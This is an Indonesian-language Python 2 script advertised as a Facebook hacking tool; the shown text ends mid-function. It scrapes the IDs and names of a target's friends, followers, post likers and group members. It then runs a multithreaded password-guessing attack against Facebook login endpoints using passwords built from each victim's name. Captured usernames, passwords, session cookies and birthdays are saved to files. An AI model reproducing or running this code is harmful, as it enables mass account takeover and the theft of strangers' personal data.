#!/usr/bin/python2
#-*-coding:utf-8-*-

import requests,bs4,sys,os,subprocess,datetime,run
import requests,sys,random,time,re,base64,json
from concurrent.futures import ThreadPoolExecutor as YayanGanteng
from datetime import datetime
from bs4 import BeautifulSoup as parser
ct = datetime.now()
n = ct.month
bulan = ['Januari', 'Februari', 'Maret', 'April', 'Mei', 'Juni', 'Juli', 'Agustus', 'September', 'Oktober', 'November', 'Desember']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
reload(sys)
sys.setdefaultencoding("utf-8")


ok = []
cp = []
id = []
user = []
loop = 0

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
#  Moch Yayan Juan Alvredo XD.  #
#------------------------------->


try:
    import requests
except ImportError:
    exit(' [•] module requests belum terinstall')
try:
    import bs4
except ImportError:
    exit(' [•] module bs4 belum terinstall')

logo = """\033[1;37m
       ___    _   __   ___    ____
      / \033[1;91mo\033[1;37m.)  / \,' /  / \033[1;91mo\033[1;37m.)  / __/
     / \033[1;91mo\033[1;37m \  / \,' /  / \033[1;91mo\033[1;37m \  / _/  \033[1;33m•\033[1;91m•\033[1;37m orb\033[1;91mXD\033[1;37m.
    /___,' /_/ /_/  /___,' /_/     
  \033[1;33m•\033[1;91m•\033[1;37m New Tools Hack Facebook Random \033[1;33m•\033[1;91m•\033[1;37m
 \033[1;33m•\033[1;91m•\033[1;37m Gunakan Akun Tumbal Untuk Login! \033[1;33m•\033[1;91m•\033[1;37m
\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m~\033[1;91m~\033[1;37m"""

hostm="https://m.facebook.com"
uac = 'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+' # Useragent Buat Dump
headersc = {'User-Agent' : 'Mozilla/5.0 (Linux; Android 5.0; Lenovo A7600-H Build/LRX21T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/E7FBAF','Accept-Language' : 'en-US,en;q=0.5'}
url = 'https://mobile.facebook.com/login.php'

def jalan(z):
        for e in z + '\n':
                sys.stdout.write(e)
                sys.stdout.flush()
                time.sleep(0.03)
# Boleh Di Tambahin Jangan Di Ganti #

def cek_cookies():
	cvds=None
        new=None
        if cek(1)==False:
                try:
                        cookie=cvd(open("coki.log").read().strip())
                        cvds=cvd(cookie)
                        new=True
                except:
                        print(" [•] Cookies Invalid");menuutama()
        else:
                cvds=cvd(open("coki.log").read().strip())
        r=requests.get("https://mbasic.facebook.com/profile.php",
                cookies=cvds,
        headers=hdcok()).text
        if len(bs4.re.findall("logout",r)) !=0:
		print(' [•] Mengecek Cookies')
		time.sleep(3)
		menu()
	else:
                try:
                        os.system("rm -rf coki.log")
                except:
                        pass
                print(" [•] Cookies Invalid");time.sleep(1);menuutama()

def log_token():
	os.system('clear')
	print logo
	data = raw_input("\n [•] Token: ")
	try:
		me = requests.get('https://graph.facebook.com/me?access_token='+data)
		open("login.txt",'w').write(data)
		print(" [•] Login Success")
		menu()
	except KeyError:
		print (" [•] Invalid Token")
		menuutama()

def login():
    os.system('clear')
    print logo
    cookie = raw_input("\n [•] Cookies : ")
    try:
        data = ({'user-agent' : 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','referer' : 'https://m.facebook.com/','host' : 'm.facebook.com','origin' : 'https://m.facebook.com','upgrade-insecure-requests' : '1','accept-language' : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control' : 'max-age=0','accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8','content-type' : 'text/html; charset=utf-8','cookie' : cookie })
        coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
        cari = re.search('(EAAA\w+)', coki.text)
        hasil = cari.group(1)
        pup = open('coki.log', 'w')
        pup.write(cookie)
        pup.close()
        pip = open('login.txt', 'w')
        pip.write(hasil)
        pip.close()
        menu()
    except AttributeError:
        print ' [•] Cookies Salah'
        time.sleep(3)
        menuutama()
    except UnboundLocalError:
        print ' [•] Cookies Salah'
        time.sleep(3)
        menuutama()
    except requests.exceptions.SSLError:
        print ' [•] Tidak Ada Koneksi'
        exit()
def basecookie():
	if os.path.exists("coki.log"):
		if os.path.getsize("coki.log") !=0:
			return gets_dict_cookies(open('coki.log').read().strip())
		else:cek_cookies()
	else:cek_cookies()
def gets_dict_cookies(cookies):
	result={}
	try:
		for i in cookies.split(";"):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
	except:
		for i in cookies.split("; "):
			result.update({i.split("=")[0]:i.split("=")[1]})
		return result
def hdcok():
	global hostm,uac
	hosts=hostm
	r={"origin": hosts, "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7", "accept-encoding": "gzip, deflate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "user-agent": uac, "Host": "".join(bs4.re.findall("://(.*?)$",hosts)), "referer": hosts+"/login/?next&ref=dbl&fl&refid=8", "cache-control": "max-age=0", "upgrade-insecure-requests": "1", "content-type": "application/x-www-form-urlencoded"}
	return r
def cvd(cookies):
    result = {}
    try:
        for i in cookies.split(';'):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
    except:
        for i in cookies.split('; '):
            result.update({i.split('=')[0]: i.split('=')[1]})

        return result
def menu():
  try:
    toket = open('login.txt','r').read()
    otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
    a = json.loads(otw.text)
  except Exception as e:
    print (' [•] Cookies Invalid')
    time.sleep(1)
    menuutama()
  ip=requests.get("https://api.ipify.org").text.strip()
  os.system("clear")
  print logo
  print (' [•] Ip Address : '+ip)
  print ('\n [1] Dump ID Dari Teman (Dump Fast)')
  print (' [2] Dump ID Dari Publik (Dump Fast)')
  print (' [M] Dump ID Public Massal (Dump Fast)')
  print (' [3] Dump ID Dari Follower (Dump Fast)')
  print (' [4] Dump ID Dari Like (Dump Fast)')
  print (' [5] Dump ID Dari Grub (Dump Slow)')
  print (' [6] Crack With Files')
  print (' [7] Setting User Agent')
  print (' [8] Check Opsi Sesi Akun Hasil Crack')
  print (' [9] Check Result Crack Facebook')
  print (' [0] Hapus Cookies\n')
  mn = raw_input(" [•] Input : ")
  if mn == "":
	print (' [•] Isi Dengan Benar')
	menu()
  elif mn == "1" or mn == '01':
    teman()
  elif mn =="2" or mn == '02':
    publik()
  elif mn =="m" or mn == 'M':
    massal()
  elif mn == "3" or mn == '03':
    follow()
  elif mn == "4" or mn == '04':
    like()
  elif mn == "5" or mn == '05':
    dump_grup(basecookie())
  elif mn =="6" or mn == '06':
    __crack__().plerr()
  elif mn =="7" or mn == '07':
    setua()
  elif mn =="8" or mn == '08':
      syngara()
  elif mn =="9" or mn == '09':
      resultcrack()
  elif mn == "0" or mn == '00':
    os.system("rm -rf login.txt")
    os.system("rm -rf coki.log")
    print (' [•] Berhasil Menghapus Cookies')
    time.sleep(1)
    menuutama()
  else:
    print (' [•] Isi Dengan Benar')
    menu()

def teman():
        try:
            toket=open('login.txt','r').read()
        except IOError:
            print (' [•] Cookies Invalid')
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            menuutama()
        try:
            r=requests.get("https://graph.facebook.com/me/friends?access_token="+toket+"&limit=10000")
            id = []
            z=json.loads(r.text)
            qq = ('teman.json').replace(" ","_")
            ys = open(qq , 'w')#.replace(" ","_")
            for a in z['data']:
                id.append(a['id']+"<=>"+a['name'])
                ys.write(a['id']+"<=>"+a['name']+'\n')
            print("\r [•] Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
            ys.close()
            print("\n\n [•] Selesai")
            print(" [•] File Tersimpan : teman.json")
            raw_input(" Back")
            menu()
        except requests.exceptions.ConnectionError:
            print (' [•] Tidak Ada Koneksi')
            os.sys.exit()
def publik():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print (' [x] Cookies Invalid')
		os.system('rm -rf login.txt')
		time.sleep(0.01)
		menuutama()
	try:
		idt = raw_input(" [•] ID Target : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print(" [•] Nama : "+op["name"])
		except KeyError:
			print(' [•] ID Tidak Temukan')
			raw_input(" Back")
			menu
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(10000)&access_token="+toket)
		id = []
		z=json.loads(r.text)
		qq = ('public.json').replace(" ","_")
		ys = open(qq , 'w')#.replace(" ","_")
		for a in z['friends']['data']:
			id.append(a['id']+"<=>"+a['name'])
			ys.write(a['id']+"<=>"+a['name']+'\n')
		print("\r [•] Dump %s ID"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
		ys.close()
		print("\n\n [•] Selesai")
		print(" [•] File Dump Tersimpan : public.json")
		raw_input(" Back")
		menu()
	except Exception as e:
		print(' [•] Tidak Ada Teman')
		menu()
	except KeyError:
		print(' [•] Tidak Ada Teman')
		raw_input(' Back')
		menu()
def follow():
        try:
            toket=open('login.txt','r').read()
        except IOError:
            print (' [•] Cookies Invalid')
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            menuutama()
        try:
            idt = raw_input("\n [•] ID Followers : ")
            jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
            op = json.loads(jok.text)
            print(" [*] Nama : "+op["name"])
        except KeyError:
            print (' [•] ID Tidak Ditemukan')
            raw_input(" Back")
            menu()
        try:
            r=requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+toket+"&limit=10000")
            id = []
            z=json.loads(r.text)
            qq = ('foll.json').replace(" ","_")
            ys = open(qq , 'w')#.replace(" ","_")
            for a in z['data']:
                id.append(a['id']+"<=>"+a['name'])
                ys.write(a['id']+"<=>"+a['name']+'\n')
            print("\r [*] Dump %s ID\r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
            ys.close()
            print("\n\n [•] Selesai")
            print(" [•] File Dump Tersimpan : foll.json")
            raw_input(" Back")
            menu()
        except KeyError:
            print(' [•] Tidak Ada Followers')
            raw_input(' Back')
            menu()
        except requests.exceptions.ConnectionError:
            print(' [•] Tidak Ada Koneksi')
            os.sys.exit()
def like():
        try:
            toket=open('login.txt','r').read()
        except IOError:
            print(' [•] Cookies Invalid')
            os.system('rm -rf login.txt')
            time.sleep(0.01)
            menuutama()
        try:
            idt = raw_input("\n [•] Post ID : ")
            try:
                r=requests.get("https://graph.facebook.com/"+idt+"/likes?limit=10000&access_token="+toket)
            except KeyError:
                print (' [•] Post ID Tidak Ada')
                raw_input(" Back")
                menu()
            id = []
            z=json.loads(r.text)
            qq = ('like.json').replace(" ","_")
            ys = open(qq , 'w')#.replace(" ","_")
            for a in z['data']:
                id.append(a['id']+"<=>"+a['name'])
                ys.write(a['id']+"<=>"+a['name']+'\n')
            print("\r [•] Dump %s ID \r"%(str(len(id)))),;sys.stdout.flush();time.sleep(0.007)
            ys.close()
            print("\n\n [•] Selesai")
            print(" [•] File Dump Tersimpan : like.json")
            raw_input(" Back")
            menu()
        except KeyError:
            print (' [•] Harus Berupa ID Postingan')
            raw_input(' Back')
            menu()
        except requests.exceptions.ConnectionError:
            print (' [•] Tidak Ada Koneksi')
            os.sys.exit()

def setua():
    print("\n [1] Set User agent sendiri")
    print(" [2] Cek User agent sekarang")
    print(" [0] Back")
    print("")
    pil_ua=raw_input(" [•] Choose: ")
    if pil_ua == "1" or pil_ua == "01":
        print("\n [•] Masukan User agent dengan benar agar tidak eror!")
        user=raw_input("\n [•] Masukan Ua: ")
        open("ua.txt", "w").write(user)
        print("\n [•] Sedang mengganti User agent!")
        time.sleep(1.5)
        print(" [•] Succes mengganti User agent!")
        raw_input(" [BACK]")
        menu()
    elif pil_ua == "2" or pil_ua == "02":
        print("\n [•] User agent sekarang: %s "%(open('ua.txt').read()))
        raw_input("\033[1;37m [BACK]")
        menu()
    elif pil_ua == "0" or pil_ua == "00":
        menu()
    else:
        print("\n [•] Pilihan Tidak Ada!")

def massal():
	global token
	try:
		token = open("login.txt", "r").read()
	except IOError:
		exit(" [!] token kadaluwarsa")
	try:
		tanya_total = int(raw_input(" [•] jumlah target id : "))
	except:tanya_total=1
	print("\n [•] isi 'me' jika ingin dari daftar teman")
	for t in range(tanya_total):
		t +=1
		idt = raw_input(" [•] id target %s : "%(t))
		try:
			r=requests.get("https://graph.facebook.com/%s/friends?access_token=%s"%(idt, token))
			z=json.loads(r.text)
			ys=open("mpublic.txt","a")
			for i in z['data']:
				uid = i["id"]
				nama = i["name"]
				id.append(uid+"<=>"+nama)
				ys.write(uid+"<=>"+nama+"\n")
			ys.close()
		except KeyError:
			print(" [!] akun tidak tersedia atau list teman private")
	print(" [•] total id  : \033[0;91m%s\033[0;97m"%(len(id)))
	renametnya()

def renametnya():
    try:
        open("mpublic.txt","r")
        os.system("mv mpublic.txt mpublic.json")
        print(" [•] files dump tersimpan di : mpublic.json")
        time.sleep(2)
        menu()
    except Exception as e:
        print(" [!] %s"%(e))
class dump_grup:

    def __init__(self, cookies):
        self.glist = []
        self.cookies = cookies
        self.extract('https://m.facebook.com/groups/?seemore')

    def extract(self, url):
        bs = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        for i in bs.find_all('a', href=True):
            if '/groups/' in i.get('href'):
                if 'category' in i.get('href') or 'create' in i.get('href'):
                    continue
                else:
                    self.glist.append({'id': ('').join(bs4.re.findall('/groups/(.*?)\\?', i.get('href'))), 
                       'name': i.text})
        while True:
            self.manual()
            exit()

    def manual(self):
        id = raw_input(' [•] Grub ID : ')
        if id == '':
            self.manual()
        else:
            r = bs4.BeautifulSoup(requests.get('https://m.facebook.com/groups/' + id, headers=hdcok(), cookies=self.cookies).text, 'html.parser')
            if 'konten tidak' in r.find('title').text.lower():
                exit(' [•] Grub ID Tidak Valid/Anda Belum Bergabung Grub')
            else:
                self.listed = {'id': id, 'name': r.find('title').text}
                self.f()
                print ' [•] Nama Grub : %s' % self.listed.get('name')[0:20]
                self.dumps('https://m.facebook.com/groups/' + id)
    def f(self):
        self.fl = ("grub.json")
        if self.fl == '':
            self.fl()
        open(self.fl, 'w').close()

    def dumps(self, url):
        r = bs4.BeautifulSoup(requests.get(url, cookies=self.cookies, headers=hdcok()).text, 'html.parser')
        print "\r [•] Dump %s ID *type ctrl+z to stop\r" % len(open(self.fl).read().splitlines()),;sys.stdout.flush();time.sleep(0.007)
        for i in r.find_all('h3'):
            try:
                if len(bs4.re.findall('\\/', i.find('a', href=True).get('href'))) == 1:
                    ogeh = i.find('a', href=True)
                    if 'profile.php' in ogeh.get('href'):
                        a = ('').join(bs4.re.findall('profile\\.php\\?id=(.*?)&', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
                            continue
                    else:
                        a = ('').join(bs4.re.findall('/(.*?)\\?', ogeh.get('href')))
                        if len(a) == 0:
                            continue
                        elif a in open(self.fl).read():
                            continue
                        else:
                            open(self.fl, 'a+').write('%s<=>%s\n' % (a, ogeh.text))
            except:
                continue

        for i in r.find_all('a', href=True):
            if 'Lihat Postingan Lainnya' in i.text:
                while True:
                    try:
                        self.dumps('https://m.facebook.com/' + i.get('href'))
                        break
                    except Exception as e:
                        print '\r [•] %s, Mencoba Lagi' % e
                        continue

	print ('\n\n [•] Selesai')
	print (' [•] File Dump Tersimpan : '+self.fl)
	raw_input(" Back")
	menu()

def cek(arg):
	if os.path.exists("coki.log"):
		if os.path.getsize("coki.log") !=0:
			return True
		else:return False
	else:return False


def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        exit(run.tanyadlu())
    else:
        print('\n [•] Waduh Lu Gak Dapet Result :(');exit()

def tanyadlu():
    print("\n [•] Check Opsi Akun Yang Terkena Cp? y/t")
    pilih=raw_input(" [•] Pilih: ")
    if pilih == "y" or pilih == "Y":
        option_sesi()
    elif pilih == "t" or pilih == "t":
        os.sys.exit()
    else:print(' [•] Pilihan Tidak Ada!')

class __crack__:

    def __init__(self):
        self.id = []

    def plerr(self):
        try:
            self.apk = raw_input('\n [•] masukan file : ')
            self.id = open(self.apk).read().splitlines()
        except:
            print('\n [•] File Tidak Ada!"');time.sleep(3);menu()
        ___yayanganteng___ = raw_input(' [•] apakah anda ingin menggunakan kata sandi manual? [Y/t]: ')
        if ___yayanganteng___ in ('Y', 'y'):
            print '\n [•] gunakan , (koma) untuk pemisah contoh : sandi123,sandi12345,dll. setiap kata minimal 6 karakter atau lebih'
            while True:
                pwek = raw_input('\n [•] masukan kata sandi : ')
                print ' [•] crack dengan sandi -> [ %s ]' % (pwek)
                if pwek == '':
                    print '\n [•] jangan kosong bro kata sandi nya'
                elif len(pwek)<=5:
                    print '\n [•] kata sandi minimal 6 karakter'
                else:
                    def __yan__(ysc=None): # ycs => Yayan sayang Cindy:3
                        cin = raw_input('\n [•] method : ')
                        if cin == '':
                            print('\n [•] jangan kosong bro');self.__yan__()
                        elif cin == '1':
                            print ('\n [•] hasil ok disimpan ke -> ok.txt');time.sleep(0.2)
                            print (' [•] hasil cp disimpan ke -> cp.txt');time.sleep(0.2)
                            jalan('\n [•] anda bisa mematikan data selular untuk menjeda proses crack\n');time.sleep(0.2)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__api__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '2':
                            print ('\n [•] hasil ok disimpan ke -> ok.txt');time.sleep(0.2)
                            print (' [•] hasil cp disimpan ke -> cp.txt');time.sleep(0.2)
                            jalan('\n [•] anda bisa mematikan data selular untuk menjeda proses crack\n');time.sleep(0.2)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mbasic__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        elif cin == '3':
                            print ('\n [•] hasil ok disimpan ke -> ok.txt');time.sleep(0.2)
                            print (' [•] hasil cp disimpan ke -> cp.txt');time.sleep(0.2)
                            jalan('\n [•] anda bisa mematikan data selular untuk menjeda proses crack\n');time.sleep(0.2)
                            with YayanGanteng(max_workers=30) as (__yayanXD__):
                                for ikeh in self.id:
                                    try:
                                        kimochi = ikeh.split('<=>')[0]
                                        __yayanXD__.submit(self.__mfb__, kimochi, ysc)
                                    except: pass

                            os.remove(self.apk)
                            hasil(ok,cp)
                        else:
                            print('\n [•] input yang bener');self.__yan__()
                    print '\n [ pilih method login - silahkan coba satu² ]\n'
                    print ' [1]. method API (fast)'
                    print ' [2]. method mbasic (slow)'
                    print ' [3]. method mobile (super slow)'
                    __yan__(pwek.split(','))
                    break
        elif ___yayanganteng___ in ('T', 't'):
            print '\n [ pilih method login - silahkan coba satu² ]\n'
            print ' [1]. method API (fast)'
            print ' [2]. method mbasic (slow)'
            print ' [3]. method mobile (super slow)'
            self.__pler__()
        else:
            print ('\n [•] y/t goblok!');time.sleep(2);menu()
        return

    def __api__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [crack] %s/%s -> OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
            	_kontol = open('ua.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            headers_ = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), "x-fb-sim-hni": str(random.randint(20000, 40000)), "x-fb-net-hni": str(random.randint(20000, 40000)), "x-fb-connection-quality": "EXCELLENT", "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA", "user-agent": _kontol, "content-type": "application/x-www-form-urlencoded", "x-fb-http-engine": "Liger"}
            api = 'https://b-api.facebook.com/method/auth.login'
            params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32',  'format': 'JSON', 'sdk_version': '2', 'email': user, 'locale': 'en_US', 'password': pw, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
            response = requests.get(api, params=params, headers=headers_)
            if 'access_token' in response.text and 'EAAA' in response.text:
                print '\r  %s* --> %s|%s                 %s' % (H,user,pw,N)
                wrt = '%s|%s' % (user,pw)
                ok.append(wrt)
                open('ok.txt', 'a').write('%s\n' % wrt)
                break
                continue
            elif 'www.facebook.com' in response.json()['error_msg']:
                try:
                    kontol = open('login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('cp.txt', 'a').write('%s\n' % wrt)
                    open('checkcp.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('cp.txt','a').write('%s\n' % wrt)
                open('checkcp.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mbasic__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [crack] %s/%s -> OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
            	_kontol = open('ua.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://mbasic.facebook.com")
            b = ses.post("https://mbasic.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = '%s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('ok.txt','a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('cp.txt','a').write('%s\n' % wrt)
                    open('checkcp.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('cp.txt', 'a').write('%s\n' % wrt)
                open('checkcp.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [crack] %s/%s -> OK-:%s - CP-:%s '%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try:
            	_kontol = open('ua.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]'
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = '%s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('ok.txt', 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('login.txt').read()
                    cp_ttl = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol)).json()['birthday']
                    month, day, year = cp_ttl.split('/')
                    month = bulan_ttl[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = '%s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('cp.txt').write('%s\n' % wrt)
                    open('checkcp.txt', 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day   = ''
                    year  = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = '%s|%s' % (user,pw)
                cp.append(wrt)
                open('cp.txt', 'a').write('%s\n' % wrt)
                open('checkcp.txt', 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1

    def __pler__(self):
        yan = raw_input('\n [•] method : ')
        if yan == '':
            print ('\n [•] jangan kosong bro');self.__pler__()
        elif yan in ('1', '01'):
            print ('\n [•] hasil ok disimpan ke -> ok.txt');time.sleep(0.2)
            print (' [•] hasil cp disimpan ke -> cp.txt');time.sleep(0.2)
            jalan('\n [•] anda bisa mematikan data selular untuk menjeda proses crack\n');time.sleep(0.2)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__api__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print ('\n [•] hasil ok disimpan ke -> ok.txt');time.sleep(0.2)
            print (' [•] hasil cp disimpan ke -> cp.txt');time.sleep(0.2)
            jalan('\n [•] anda bisa mematikan data selular untuk menjeda proses crack\n');time.sleep(0.2)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        uid, name = yntkts.split('<=>')
                        xz = name.split(' ')
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        else:
                            pwx = [name, xz[0]+"123", xz[0]+"12345"]
                        __yayanXD__.submit(self.__mbasic__, uid, pwx)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print ('\n [•] hasil ok disimpan ke -> ok.txt');time.sleep(0.2)
            print (' [•] hasil cp disimpan ke -> cp.txt');time.sleep(0.2)
